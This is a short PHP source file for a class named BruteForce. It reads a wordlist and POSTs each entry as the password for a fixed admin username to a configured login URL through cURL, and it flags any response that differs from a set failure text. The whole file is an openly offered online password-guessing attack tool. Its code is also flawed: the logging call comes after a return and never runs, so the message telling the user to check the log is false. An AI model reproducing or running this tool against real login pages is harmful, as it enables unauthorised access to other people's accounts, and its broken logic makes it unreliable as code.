<?php

/*
* PHPBruteForce Class
*
* @author ItsMeSam
* @website https://github.com/itsmesam
* @license MIT License
*/

class BruteForce 
{
	/*
	* @param {array} settings 
	*/
	protected static $settings = array();

	/*
	* @param {string} curl
	*/ 
	protected $curl;

	/*
	* @param {array} data
	*/
	protected static $data = array();




	/*
	* @param {array} settings
	*/
	public static function init(array $settings)
	{
		self::$settings = $settings;
	}


	protected function scanFile() 
	{
		if ( !file_exists( self::$settings['wordlist'] ) )
		{
			trigger_error( 'File doesn\'t exist' );
		} 
		else
		{
			$file = fopen( self::$settings['wordlist'], 'r');
			$file = fread( $file, filesize( self::$settings['wordlist'] ) );
			$file = str_replace( " ", "", $file);
			$file = str_replace( "\r", "", $file);
			return preg_split( "(\n)", $file );
		}
		
	}	


	/*
	* @param {string} data
	*/
	protected function logAttack($data)
	{
		if ( !file_exists(self::$settings['outputfile'] ) )
		{
			trigger_error('Output file doesn\'t exist ');
		}

		date_default_timezone_set(self::$settings['timezone']);
		$date = date('m/d/Y h:i:s a', time());

		file_put_contents(self::$settings['outputfile'],"[{$date}] Server: " .  $data . "\n", FILE_APPEND);
	}


	public function attack()
	{
		foreach( $this->scanFile() as $l => $f)
		{
			self::$data[self::$settings['username']] = self::$settings['adminname'];
			self::$data[self::$settings['password']] = $f;

			$this->curl = curl_init( self::$settings['url'] );
			curl_setopt( $this->curl, CURLOPT_POST, true );
			curl_setopt( $this->curl, CURLOPT_POSTFIELDS, http_build_query( self::$data ) );
			curl_setopt( $this->curl, CURLOPT_RETURNTRANSFER, true);


			if (curl_exec( $this->curl ) != self::$settings['failcontent'])
			{
				return "Found a combo. Check the output log.";
				$this->logAttack('Found a matching combination (' . self::$settings['adminname'] . ':' . $f .') in line ' . $l . ' of ' . self::$settings['wordlist'] );
			} 
			
		}	
		curl_close($this->curl);
		
	}

}